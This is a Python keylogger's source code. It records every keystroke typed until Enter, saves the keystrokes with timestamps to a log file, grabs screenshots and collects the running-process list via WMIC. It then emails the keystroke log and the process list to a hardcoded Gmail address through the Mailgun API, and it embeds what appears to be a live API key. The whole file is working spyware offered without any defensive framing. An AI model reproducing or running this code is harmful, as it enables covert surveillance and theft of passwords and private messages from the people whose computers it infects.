import keyboard
import requests
import datetime
import time
import pyscreenshot as ImageGrab
import subprocess

def screenShot():
    # fullscreen
    im=ImageGrab.grab()
    im.save("file.png")

def file_flush():
    f = open("LOG.txt", 'w')
    f.write("\n")
    f.close()

def file_input(recorded):
    now_time = datetime.datetime.now()
    w = open("LOG.txt", 'a')

    w.write("\n")
    w.write(str(recorded))
    w.write("\n")
    w.write("\n")
    w.write("--------------------------------------\n")
    w.write("\n")
    w.write(str(now_time))
    w.write("\n")
    w.write("--------------------------------------\n")
    w .close()

def file_write(typedstr):
    w = open("LOG.txt", 'a')

    w.write("\n")
    w.write(typedstr)
    w.write("\n")
    w.write("\n")
    w.write("--------------------------------------\n")
    w.close()

def send_simple_message(file_content):
    return requests.post(
        "https://api.mailgun.net/v3/mg.ladmail.com/messages",
        auth=("api", "key-a65a55fe6f78da49a3addfd94fa83b87"),
        data={"from": "PYKEYLOGGER <postmaster@mg.ladmail.com>",
              "to": "lad <hth225@gmail.com>",
              "subject": "Hello lad, Here is Keylogging result",
              "text":  file_content
              })

def send_LOG():
    return requests.post(
        "https://api.mailgun.net/v3/mg.ladmail.com/messages",
        auth=("api", "key-a65a55fe6f78da49a3addfd94fa83b87"),
        files=[("attachment", open("Process_list.txt"))],
        data={"from": "PSLOGFILEMANAGER <postmaster@mg.ladmail.com>",
              "to": "lad <hth225@gmail.com>",
              "subject": "Hello lad, Here is captured Process Logfile",
              "text": "CAPTURED PROCESS LOGFILE"
              })

def parse_process_list():
    cmd = 'WMIC PROCESS get Caption,Commandline,Processid'
    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
    file = open("Process_list.txt", "w")
    for line in proc.stdout:
        file.write(str(line))

if __name__ == "__main__":

     while 1:
         status = time.localtime()
         recorded = keyboard.record(until='enter')
         typedstr = " ".join(keyboard.get_typed_strings(recorded))
         file_input(recorded)
         file_write(typedstr)

         f = open("LOG.txt", 'r')
         file_content = f.read()
         f.close()

         screenShot()
         with open('LOG.txt') as f:
             count = (sum(1 for _ in f))

         if (count >= 20):
            parse_process_list()
            send_simple_message(file_content)
            send_LOG()
            print("done")
            file_flush()